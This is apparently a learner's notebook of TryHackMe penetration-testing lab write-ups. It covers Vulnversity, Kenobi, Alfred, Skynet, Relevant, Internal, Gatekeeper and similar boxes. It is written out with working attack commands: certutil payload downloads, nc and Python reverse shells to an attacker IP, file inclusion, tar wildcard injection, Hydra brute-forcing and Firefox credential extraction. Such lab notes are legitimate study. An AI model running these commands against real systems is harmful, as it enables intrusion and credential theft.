# Penetration Test THM Pathway
![hacker](oscp.png)
Following notes I took facing some challange\box, so these are not properly write-up\walkthrough, often just an aspect is covered (e.g. privilege escalation). I took the notes since I discovered new tactics, sometime reading someone else blog or article, or just because I liked the exploitation path.

## Vulnversity
### Priv escalation
Find SUID files on the victim
  
    find / -perm -u=s -type f 2>/dev/null
    /usr/bin/newuidmap
    ...
    /bin/systemctl
     ...

On the attacker create the following service configuration file as service01.phtml

    [Unit]
    Description=Service 01
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'cat /root/root.txt'
    
    [Install]
    WantedBy=multi-user.target

Upload the file using the form to the victim, (http://10.10.13.154:3333/internal/), then perform the following steps:

    cd /var/www/html/internal/uploads
    mv service01.phtml service01.service
    /bin/systemctl enable /var/www/html/internal/uploads/service01.service
      Created symlink from /etc/systemd/system/multi-user.target.wants/service01.service to /var/www/html/internal/uploads/service01.service.
      Created symlink from /etc/systemd/system/service01.service to /var/www/html/internal/uploads/service01.service.
Start the service:

    /bin/systemctl status service01
Check the execution to get the flag: a58ff8579f0a9270368d33a9966c7fd5

    /bin/systemctl status service01
    * service01.service - Service 01
       Loaded: loaded (/var/www/html/internal/uploads/service01.service; enabled; vendor preset: enabled)
       Active: inactive (dead) since Mon 2024-04-29 06:38:29 EDT; 1min 4s ago
      Process: 12889 ExecStart=/bin/bash -c cat /root/root.txt (code=exited, status=0/SUCCESS)
     Main PID: 12889 (code=exited, status=0/SUCCESS)
    
    Apr 29 06:38:29 vulnuniversity systemd[1]: Started Service 01.
    Apr 29 06:38:29 vulnuniversity bash[12889]: a58ff8579f0a9270368d33a9966c7fd5

## Kenobi
### Priv escalation
Search SUID file

    find / -perm -u=s -type f 2>/dev/null
    ...
    /usr/bin/menu
    ...

Check readable strings inside the file

    strings /usr/bin/menu 
      []A\A]A^A_
      ***************************************
      1. status check
      2. kernel version
      3. ifconfig
      ** Enter your choice :
      curl -I localhost
      uname -r
      ifconfig
       Invalid choice
      ;*3$"

The menu calls 3 commands: curl, kernel, ifconfig, without specifing the full path. This allows us to create a malicious version of once of the executed commands, e.g. ifconfig.
Inspecting the PATH enviroment variable:

    echo $PATH
      /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
We can see that current user bin directory is in the PATH, so we can just create our malicious version of ifconfig inside the user's home bin directory:

     pwd
      /home/kenobi
    mkdir bin
    cd bin
    echo "cat /root/root.txt" > ifconfig
    chmod ugo+x ifconfig 
Executing the command we get an access error since we don't have the permission to read the flag:

      ifconfig 
      cat: /root/root.txt: Permission denied
    
But if we call it using the menu command interface we get the flag:

    kenobi@kenobi:~$ menu
    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :3
    177b3cd8562289f37382721c28381f02

## Alfred
### Execute DOS command in jenkins
1. In a project, select configure, Scroll down to the Buil section, insert your command there: download netcat from the attacker machine and verify

       certutil -urlcache -split -f "http://10.9.0.171:8000/nc64.exe" "nc64.exe"   && dir
2. Build the project (it will take a while since nc has tobe downloaded)
3. Then select the first entry in the Build history section
4. Then click Console output and you should see something similar:

        Started by user admin
        Running as SYSTEM
        Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
        [project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins2706411477596705408.bat
        
        C:\Program Files (x86)\Jenkins\workspace\project>certutil -urlcache -split -f "http://10.9.0.171:8000/nc64.exe" "nc64.exe"     && dir
        ****  Online  ****
          0000  ...
          b0d8
        CertUtil: -URLCache command completed successfully.
         Volume in drive C has no label.
         Volume Serial Number is E033-3EDD
        
         Directory of C:\Program Files (x86)\Jenkins\workspace\project
        
        04/30/2024  10:37 AM    <DIR>          .
        04/30/2024  10:37 AM    <DIR>          ..
        04/30/2024  10:37 AM            45,272 nc64.exe
                       2 File(s)      4,908,760 bytes
                       2 Dir(s)  20,509,741,056 bytes free
        
        C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
        Finished: SUCCESS


Then we can repeat the previous steps, change the command (1) to get a reverse shell:

    nc64.exe 10.9.0.171 1234 -e cmd.exe

Build again the project and you should get a reverse shell on your attacker machine
    
### Priv esc using incognito standalone
https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe

Download from the victim:

     certutil -urlcache -split -f "http://10.9.0.171:8000/incognito.exe" "incognito.exe" 
    
Now we can list the available tokens:

    incognito.exe list_tokens -u 
    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
    [*] Enumerating tokens
    [*] Listing unique users found
    
    Delegation Tokens Available
    ============================================
    alfred\bruce 
    IIS APPPOOL\DefaultAppPool 
    NT AUTHORITY\IUSR 
    NT AUTHORITY\LOCAL SERVICE 
    NT AUTHORITY\NETWORK SERVICE 
    NT AUTHORITY\SYSTEM 
    
    Impersonation Tokens Available
    ============================================
    NT AUTHORITY\ANONYMOUS LOGON 
    
    Administrative Privileges Available
    ============================================
    SeAssignPrimaryTokenPrivilege
    SeCreateTokenPrivilege
    SeTcbPrivilege
    SeTakeOwnershipPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeDebugPrivilege
    SeImpersonatePrivilege
    SeRelabelPrivilege
    SeLoadDriverPrivilege

Since we cannot use none of the available delegation tokens, we can try to add a user to local administrator using incognito:

    incognito.exe add_user catwoman Pwd1234! && incognito.exe add_localgroup_user Administrators catwoman 
    ...
    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
    [*] Enumerating tokens
    [*] Attempting to add user catwoman to host 127.0.0.1
    [+] Successfully added user
    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
    [*] Enumerating tokens
    [*] Attempting to add user catwoman to local group Administrators on host 127.0.0.1
    [+] Successfully added user to local group

Checl it out:

   
    net user catwoman
    User name                    catwoman
    Full Name                    catwoman
    ...
    Local Group Memberships      *Administrators       


Now since RDP is enabled we can access alfred as catwoman user (set tls-seclevel:0 to avoid tls connection error)

    xfreerdp /u:"alfred\catwoman" /v:10.10.36.188 /tls-seclevel:0

    
## HackPark
I created a more stable [reverse shell](HackPark/PostView.ascx) using nc to exploit CVE-2019-6714.

## GameZone
### Privilege escalation without metasploit 
I used the Python script: https://github.com/JohnHammond/CVE-2012-2982/tree/master.
Supposing you have the SSH tunnel activated on your attacker box on localhost:10000

     python CVE-2012-2982.py -t localhost -p 10000 -U agent47 -P videogamer124 -c "cat /root/root.txt > flag.txt"     
      [+] targeting host localhost on port 10000
      [+] successfully logged in with user 'agent47' and pw 'videogamer124'
      [+] executed 'cat /root/root.txt > flag.txt' on 'localhost'

Search for the file on the victim SSH session 

    agent47@gamezone:~$ find / -name flag.txt 2>/dev/null
      /usr/share/webmin/file/flag.txt
Get the flag

    agent47@gamezone:~$ cat /usr/share/webmin/file/flag.txt
      a4b945830144bdd71908d12d902adeee

## Skynet
Map smb share

    smbmap -H 10.10.18.58
    ...  
                                                                                                    
    [+] IP: 10.10.18.58:445 Name: 10.10.18.58               Status: Authenticated
            Disk                                                    Permissions     Comment
            ----                                                    -----------     -------
            print$                                                  NO ACCESS       Printer Drivers
            anonymous                                               READ ONLY       Skynet Anonymous Share
            milesdyson                                              NO ACCESS       Miles Dyson Personal Share
            IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

We can access the anonymous share only:

    smbclient \\\\10.10.18.58\\anonymous 
    Password for [WORKGROUP\zinz]:
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Thu Nov 26 17:04:00 2020
      ..                                  D        0  Tue Sep 17 09:20:17 2019
      attention.txt                       N      163  Wed Sep 18 05:04:59 2019
      logs                                D        0  Wed Sep 18 06:42:16 2019

                9204224 blocks of size 1024. 5831512 blocks available
    smb: \> get attention.txt 
    getting file \attention.txt of size 163 as attention.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
    smb: \> cd logs\
    smb: \logs\> ls
      .                                   D        0  Wed Sep 18 06:42:16 2019
      ..                                  D        0  Thu Nov 26 17:04:00 2020
      log2.txt                            N        0  Wed Sep 18 06:42:13 2019
      log1.txt                            N      471  Wed Sep 18 06:41:59 2019
      log3.txt                            N        0  Wed Sep 18 06:42:16 2019
    
                    9204224 blocks of size 1024. 5831512 blocks available
    
    smb: \logs\> get log1.txt 
    getting file \logs\log1.txt of size 471 as log1.txt (1.2 KiloBytes/sec) (average 0.9 KiloBytes/sec)

Search hidden folder on the web server

    ffuf -u http://10.10.18.58/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c

    
       v2.1.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://10.10.18.58/FUZZ
     :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    ________________________________________________

    ...
    admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 70ms]
    css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 75ms]
    js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 72ms]
    config                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 67ms]
    ai                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 67ms]
    squirrelmail            [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 82ms]
                            [Status: 200, Size: 523, Words: 26, Lines: 19, Duration: 67ms]
    server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 67ms]
    :: Progress: [220560/220560] :: Job [1/1] :: 422 req/sec :: Duration: [0:06:50] :: Errors: 0 ::

Visiting /squirrelmail we are redirected to login: /squirrelmail/src/login.php, Proceed to brute-force the login using the password list found it on the anonymous share. I created a possible combination of usernames for Miles Dyson:

    cat miles.txt          
      Miles.Dyson
      Miles-Dyson
      Miles_Dyson
      MilesDyson

Then I proceeded with Hydra:

    hydra -L miles.txt -P log1.txt 10.10.18.58 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:password incorrect"
    ...
    [80][http-post-form] host: 10.10.18.58   login: MilesDyson   password: cyborg007haloterminator

Inspecting the recived email we found the samba password: )s{A&2Z=F^n_E.B`
    
    smbclient \\\\10.10.18.58\\milesdyson -U milesdyson 
    Password for [WORKGROUP\milesdyson]:
    Try "help" to get a list of possible commands.
Download important notes

    smb: \notes\> get important.txt

We can find a CMS: http://{skynet IP}/45kra24zxs28v3yd. Fuzzing the CMS as well:

    ffuf -u http://10.10.18.58/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c 
    ...
    administrator           [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 70ms]

Visiting the administrator URL we are presented to login page of a CUPPA CMS. Tryng both the founded password for Miles Dyson but nothing worked. We can't find the version of CMS, anyway we can search for known vulnerability:

    searchsploit "CUPPA CMS"
      Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion ... php/webapps/25971.txt

We can exploit it as follows:

     http://<skynet IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker IP>/reverse-shell.php

To upgrade the shell to TTY

    python -c 'import pty;pty.spawn("/bin/bash")'
Search for file owned by root

    find /home -user root -name "*.sh" 2>/dev/null
    /home/milesdyson/backups/backup.sh
The file is executed every one minutes

    www-data@skynet:/$ ls -la /home/milesdyson/backups
    ...
    -rw-r--r-- 1 root       root       4679680 May  3 04:56 backup.tgz

    www-data@skynet:/$ ls -la /home/milesdyson/backups
    ...
    -rw-r--r-- 1 root       root       4679680 May  3 04:57 backup.tgz

### Lesson learned: tar wildcard injection privilege escalation 
[Here](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c) is explained very well

Key points are:
1. The script move to a directory
2. Inside this directory (that we have to have  write permission) we created 3 files
3. The 3 files are interpreted as arguments of the command <b>tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh shell.sh</b>

So we proceed as follows:

     cd cd /var/www/html
     # 1
     echo 'cat /root/root.txt > root.txt' > getFlag.sh
     # 2 
     echo "" > "--checkpoint-action=exec=sh getFlag.sh"
     # 3
     echo "" > --checkpoint=1

    ls -la

    total 80
    -rw-rw-rw- 1 www-data www-data     1 May  3 05:20 --checkpoint-action=exec=sh getFlag.sh
    -rw-rw-rw- 1 www-data www-data     1 May  3 05:20 --checkpoint=1
    ...
    -rw-rw-rw- 1 www-data www-data    32 May  3 05:20 getFlag.sh

After a minute we should find the root.txt file containing the flag.

## Daily Bugle
### Find Joomla versiom visit:

    http://10.10.25.244/administrator/manifests/files/joomla.xml
    ...
    <version>3.7.0</version>
      <creationDate>April 2017</creationDate>
      <description>FILES_JOOMLA_XML_DESCRIPTION</description>
    ...

Alternative:

    http://10.10.25.244/README.txt
    ....
    1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
    
Search for exploit:

	searchsploit "Joomla! 3.7"
	....
	Joomla! 3.7 - SQL Injection             php/remote/44227.php

### Exploit Joomla!
Load the php file into your web server with Php enabled (I used ver. 8.2.12), insert the base url: http://joomla.ip. 
The exploit will return the user and the hashed password, the hash type is bcrypt, that corresponds to hashcat mode 3200.

	hashcat.exe -m 3200 -a 0 hash_bcrypt.txt C:\Users\******\wordlist\rockyou.txt

To get a reverse shell, once logged in, navigate to the template and create a new php file, e.g. rs.php. You can call the created file using the following path:

	http://joomla.ip/tamplates/[template-name]/rs.php 
 in my case is:
 
	http://10.10.231.185/templates/beez3/rs.php

Note that this is not the default template used, in this way the exploit will be more difficult to detect. Get a reverse php shell.

### Priv escalation
I created another txt with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) content, then I searched for the file:

	find /var/www -name linpeas.txt -print
	  /var/www/html/templates/beez3/linpeas.txt
  	mv /var/www/html/templates/beez3/linpeas.txt /var/www/html/templates/beez3/linpeas.sh
   	chmod ugo+x /var/www/html/templates/beez3/linpeas.sh
Then execute it

	/var/www/html/templates/beez3/linpeas.sh
 Found a password

 	╔══════════╣ Searching passwords in config PHP files
	/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu'

Inspecting the file

 	more /var/www/html/configuration.php
We can read that the password is for mysql root user to access mysql. Try if it reused.
Does not work for root, but work for jjameson. Let's use again linpeas.
                                                                                                                                                                                         
	╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
	╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                         	Matching Defaults entries for jjameson on dailybugle:                                                                                                                                    	...
	User jjameson may run the following commands on dailybugle:
	    (ALL) NOPASSWD: /usr/bin/yum

You can escalate the privilege to get a root shell as illustred [here](https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-2-loading-a-custom-yum-plugin).
Follows the steps and you should get a root shell.

## Overpass 2
To find the hash type used on Kali <b>hash-identifier</b>.
As shown in the source code of the backdoor:

	func hashPassword(password string, salt string) string {
		hash := sha512.Sum512([]byte(password + salt))
		return fmt.Sprintf("%x", hash)
	}
Combine password+salt. The hashcat format is:

	1710	sha512($pass:$salt)
### Privilege escalation
The SUID file to get a shell as root must be executed as follows:

	home/james$ ./.suid_bash -p      
	.suid_bash-4.4# whoami
	root


 ### Trouble shootimg to connect using ssh
 Problem: no matching host key type found. Their offer: ssh-rsa

 Solution: add the following in your ssh config file, /etc/ssh/ssh_config

 	HostKeyAlgorithms = +ssh-rsa
	PubkeyAcceptedAlgorithms = +ssh-rsa
Once terminated with this box undo the action since it is insecure

## Relevant
### Scan the services

	nmap -A -sVC -T4 10.10.153.188 -v
 ### Enumerate SMB

 	smbclient -L 10.10.153.188

        Sharename       Type      Comment
        ---------       ----      -------
        ....
        nt4wrksv        Disk      

 	
  Connect to the share without password
  
  	smbclient //10.10.153.188/nt4wrksv
	...
	smb: \> ls
	  .                                   D        0  Sat Jul 25 23:46:04 2020
	  ..                                  D        0  Sat Jul 25 23:46:04 2020
	  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 4950430 blocks available

	smb: \> get passwords.txt 
### Decode passwords

	echo -n 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
### Attack
The credentials did not work for psexec neither for RDP. Since I was stuck at this point, I enumerated again searching for other services:

	nmap -p- 10.10.153.188 -v
	...
 	49663/tcp open  unknown
	49667/tcp open  unknown
	49669/tcp open  unknown

Identify the new discovered services:

	nmap -sVC -T4 10.10.153.188 -p 49663,49667,49669 -v
	....
 	PORT      STATE SERVICE VERSION
	49663/tcp open  http    Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows Server
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Brute force directory

	ffuf -u http://10.10.153.188:49663/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301 -c
	...
 	nt4wrksv                [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 72ms]

Check if it is the shared folder we found before is actually mapped on the webserver: http://10.10.157.7:49663/nt4wrksv/passwords.txt.
Then we can upload a reverse shell:

	smb: \> put shell.aspx 
	putting file shell.aspx as \shell.aspx (36.6 kb/s) (average 36.6 kb/s)

 Then visit: http://10.10.157.7:49663/nt4wrksv/shell.aspx. Once you get the shell check privileges:

 	whoami /priv

	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State   
	============================= ========================================= ========
	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
	...
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

Since <b>SeImpersonatePrivilege</b> is enabled we can escalate out privileges using some <i>Potatoes :)</i>, I used [CoercedPotato](https://github.com/hackvens/CoercedPotato) since it is one of most simple to use it and should works even on the most recent windows OS (11 and 22):

 	smb: \> put CoercedPotato.exe 
	putting file CoercedPotato.exe as \CoercedPotato.exe (168.4 kb/s) (average 147.5 kb/s)

Then we can execute the following command to get a shell as system:

	C:\inetpub\wwwroot\nt4wrksv>.\CoercedPotato.exe -c cmd.exe
        ...						     
                                                                  
	[+] RUNNING ALL KNOWN EXPLOITS.
	
	[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe \\.\pipe\YrRlvc\pipe\spoolss.
	[PIPESERVER] Named pipe '\\.\pipe\YrRlvc\pipe\spoolss' listening...
	
	[MS-RPRN] [*] Attempting MS-RPRN functions...
	
	[MS-RPRN] Starting RPC functions fuzzing...
	 [MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: \\127.0.0.1/pipe/YrRlvc
	
	[PIPESERVER] A client connected!
	
	 ** Exploit completed **
	
	Microsoft Windows [Version 10.0.14393]
	(c) 2016 Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32>whoami
	whoami
	nt authority\system

If you did not know (like me) the subject of this exploit I suggest to read the following posts:
1. This explain how to take advantage of the named pipes, the same principle applies on CoercedPotato too:
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges.
2. Here you can check which <i>potatoes</i> still works at the moment (05.2024): 
https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all

## Internal
### Scan
Using rustscan to perform a fast all port scan

	rustscan -a internal.thm -b 1000 
	
	Open 10.10.213.134:22
	Open 10.10.213.134:80
	...
	Scanned at 2024-05-08 11:27:55 CEST for 0s
	
	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack ttl 63
	80/tcp open  http    syn-ack ttl 63

The you can check vulnerabilities with nmap

	nmap -sVC -A -v internal.thm -Pn -p 80,22 --script vuln

 ### Privilege escalation
 Search for password or credentials (whole disk, takes very long)

 	grep -Ril "password\|CredentiaL" /home /etc /opt /var/www 2>/dev/null
	.... 
  	/opt/wp-save.txt
	....
We found aubreanna:bubb13guM!@#123 then we can connect using SSH.

### Lateral movement
I used ligolo-ng instead of SSH tunnell. We found a Jenkins server

	cat jenkins.txt 
	Internal Jenkins service is running on 172.17.0.2:8080
I added the route to the ligolo interface

 	sudo ip route add 172.17.0.2/32 dev ligolo 

Then scan the host

	rustscan -a 172.17.0.2 -b 1000 
	...
 	Open 172.17.0.2:8080
	Open 172.17.0.2:50000
	...

Brute-force Jenkins login form:

	hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid"
	...
 	[8080][http-post-form] host: 172.17.0.2   login: admin   password: spongebob
	...
 In Jenkis create a test build project, then in configure, add a build action -> execute shell command:

  	#!/bin/bash
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.67",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

Since python 2.7 is enabled we use it to get a reverse shell, just build the project.

### Get root
Again we search for juicy information:

	 grep -Ril "password\|CredentiaL" /home /etc /opt /var/www 2>/dev/null
	...
	/etc/services
	/opt/note.txt

See note and login as root

	ssh root@internal.thm
 	
## Buffer Overflow Prep
Manual practice the first to challenge (Overflow1 and Overflow2), then you can auotomate it with this fantastic [tool](https://github.com/zinzloun/Buffer-Overflow-Assistant) -> To be merged

## Brainstorm
Scan the server

	rustscan -a 10.10.159.147 -b 1000
	...
	Open 10.10.159.147:21
	Open 10.10.159.147:3389
	Open 10.10.159.147:9999

Fingerprint the discovered services:

	nmap -sVC -A -p 21,3389,9999 10.10.159.147 -Pn
 	...
  	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     Microsoft ftpd
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
Login to the ftp server and downloads the files:

	ftp 10.10.159.147
	Connected to 10.10.159.147.
	220 Microsoft FTP Service
	Name (10.10.159.147:zinz): anonymous
	331 Anonymous access allowed, send identity (e-mail name) as password.
	Password: <hit enter>
	230 User logged in.
	Remote system type is Windows_NT.
	ftp> passive
	Passive mode: off; fallback to active mode: off.
	ftp> ls
	200 EPRT command successful.
	125 Data connection already open; Transfer starting.
	08-29-19  08:36PM       <DIR>          chatserver
	226 Transfer complete.
	ftp> cd chatserver
	250 CWD command successful.
	ftp> ls
	200 EPRT command successful.
	125 Data connection already open; Transfer starting.
	08-29-19  10:26PM                43747 chatserver.exe
	08-29-19  10:27PM                30761 essfunc.dll
	226 Transfer complete.
 	ftp> binary 
	200 Type set to I.
	ftp> get chatserver.exe 
	local: chatserver.exe remote: chatserver.exe
	200 EPRT command successful.
	125 Data connection already open; Transfer starting.
	100% |******************************************************************************************************************************************| 43747       94.27 KiB/s    00:00 ETA
	226 Transfer complete.
	WARNING! 45 bare linefeeds received in ASCII mode.
	File may not have transferred correctly.
	43747 bytes received in 00:00 (93.88 KiB/s)
	ftp> get essfunc.dll
	local: essfunc.dll remote: essfunc.dll
	200 EPRT command successful.
	125 Data connection already open; Transfer starting.
	100% |******************************************************************************************************************************************| 30761      108.11 KiB/s    00:00 ETA
	226 Transfer complete.
	WARNING! 32 bare linefeeds received in ASCII mode.
	File may not have transferred correctly.
	30761 bytes received in 00:00 (107.51 KiB/s)
	ftp> exit
	221 Goodbye.
                                                                  
Move the file into an adeguate Win box with Immunity Dbg installed (I used Win7x86 vm). Before to get the files from ftp serverv remember set the binary mode.
Perform the usual BOF operations locally, you will notice that the vulnerable input is the second, chat message, so you need to send a string (username) in advance before the exploit. BOF-Assistant will help you with that. Once discovered the BOF needed information locally you can directly exploit Brainstorm as follows:

	python3 BOF-Assistant.py  <brainstorm IP> 9999 -e

## Gatekeeper
As usual scan the server:

	rustscan -a 10.10.52.172 -b 1000
 	PORT      STATE SERVICE       REASON
	135/tcp   open  msrpc         syn-ack ttl 127
	139/tcp   open  netbios-ssn   syn-ack ttl 127
	445/tcp   open  microsoft-ds  syn-ack ttl 127
	3389/tcp  open  ms-wbt-server syn-ack ttl 127
	31337/tcp open  Elite         syn-ack ttl 127
	49152/tcp open  unknown       syn-ack ttl 127
	49153/tcp open  unknown       syn-ack ttl 127
	49154/tcp open  unknown       syn-ack ttl 127
	49160/tcp open  unknown       syn-ack ttl 127
	49161/tcp open  unknown       syn-ack ttl 127
	49167/tcp open  unknown       syn-ack ttl 127

Enum shares:

	nmap --script smb-enum-shares.nse -p445 10.10.52.172
 	...
  	|   \\10.10.52.172\Users: 
	|     Type: STYPE_DISKTREE
	|     Comment: 
	|     Anonymous access: <none>
	|_    Current user access: READ

Access the users shared folder and download the exe file:

	smbclient \\\\10.10.52.172\\Users
	Password for [WORKGROUP\zinz]:
	Try "help" to get a list of possible commands.
	smb: \> ls
	 ..
	  Share                               D        0  Fri May 15 03:58:07 2020
	
	                7863807 blocks of size 4096. 3878840 blocks available
	smb: \> cd Share\
	smb: \Share\> ls
	  ..
	
	                7863807 blocks of size 4096. 3878840 blocks available
	smb: \Share\> get gatekeeper.exe 
	getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (22.7 KiloBytes/sec) (average 22.7 KiloBytes/sec)

Try to interact with gatekeeper service locally:

	nc <local IP>  31337        
	aaa
	Hello aaa!!!
Load it in Immunity and perform local BOF assesment, then you can execute the BOF directly.
### Privilege escalation
Actually didn't find anythin by my own, plus without meterpreter shell all the tools I used for PE (winpeas, seatbelt) crashed the nc shell. So I decided to have a look to some write-up. 
I found that the way to go was (Fire)fox. since a profile exists for the user natbat, we can try to get some credentials using this [tool](https://github.com/unode/firefox_decrypt). 
We need the file that I'm going to copy:

	cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>

Copy the needed files:
	
	copy cert9.db C:\users\share              
	        1 file(s) copied.
	
	copy cookies.sqlite C:\users\share
	        1 file(s) copied.

	copy key4.db C:\users\share
	        1 file(s) copied.
	
	copy logins.json C:\users\share
	        1 file(s) copied.

Now download the files on the attacker:

	smbclient \\\\10.10.56.76\\Users 
	...
	smb: \> cd Share
	smb: \Share\> ls
	  .                                   D        0  Tue May 14 17:22:37 2024
	  ..                                  D        0  Tue May 14 17:22:37 2024
	  cert9.db                            A   229376  Wed Apr 22 06:47:01 2020
	  cookies.sqlite                      A   524288  Fri May 15 04:45:02 2020
	  gatekeeper.exe                      A    13312  Mon Apr 20 07:27:17 2020
	  key4.db                             A   294912  Tue Apr 21 23:02:11 2020
	  logins.json                         A      600  Fri May 15 04:43:47 2020

                7863807 blocks of size 4096. 3842160 blocks available
	smb: \Share\> get cert9.db 
	getting file \Share\cert9.db of size 229376 as cert9.db (138.9 KiloBytes/sec) (average 138.9 KiloBytes/sec)
	smb: \Share\> get cookies.sqlite 
	getting file \Share\cookies.sqlite of size 524288 as cookies.sqlite (186.0 KiloBytes/sec) (average 168.6 KiloBytes/sec)
	smb: \Share\> get key4.db 
	getting file \Share\key4.db of size 294912 as key4.db (366.4 KiloBytes/sec) (average 198.8 KiloBytes/sec)
	smb: \Share\> get logins.json 
	getting file \Share\logins.json of size 600 as logins.json (2.1 KiloBytes/sec) (average 188.6 KiloBytes/sec)

The tool search for a profile firefox folder in the user directory, so if you have firefox installed on your attacker machine use the root user:

	python firefox_decrypt.py    
	2024-05-14 17:40:29,622 - WARNING - profile.ini not found in /root/.mozilla/firefox
	2024-05-14 17:40:29,623 - WARNING - Continuing and assuming '/root/.mozilla/firefox' is a profile location
	2024-05-14 17:40:29,623 - ERROR - Profile location '/root/.mozilla/firefox' is not a directory

So create the needed directories:

	mkdir -p /root/.mozilla/firefox
Then move the files over there:

	 mv cert9.db cookies.sqlite key4.db logins.json /root/.mozilla/firefox
Execute the python script again:

	python firefox_decrypt.py
	2024-05-14 17:45:42,737 - WARNING - profile.ini not found in /root/.mozilla/firefox
	2024-05-14 17:45:42,737 - WARNING - Continuing and assuming '/root/.mozilla/firefox' is a profile location
	
	Website:   https://creds.com
	Username: 'mayor'
	Password: 'xxxxxxxxxxxxxxx'

You can connect through RDP now:

	xfreerdp /v:10.10.129.130 /tls-seclevel:0 /u:mayor /p:xxxxxxxxxxxxxxx


## Brainpan 1
Scan the box:

	rustscan -a <brainpan IP> -b 900
	...
 	PORT      STATE SERVICE          REASON
	9999/tcp  open  abyss            syn-ack ttl 63
	10000/tcp open  snet-sensor-mgmt syn-ack ttl 63

 Fingerprint the services:

 	nmap 10.10.189.107 -sVC -Pn -O -p 9999,10000
 
	PORT      STATE SERVICE VERSION
	9999/tcp  open  abyss?
	| fingerprint-strings: 
	|   NULL: 
	|     _| _| 
	|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
	|     _|_| _| _| _| _| _| _| _| _| _| _| _|
	|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
	|     [________________________ WELCOME TO BRAINPAN _________________________]
	|_    ENTER THE PASSWORD
 
	10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
We have a custom service and HTTP Python Simple server (are you practicing safe-coding).
Perform directory discovery on the web server:

	ffuf -u http://10.10.189.107:10000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301
	...
 	bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
	...
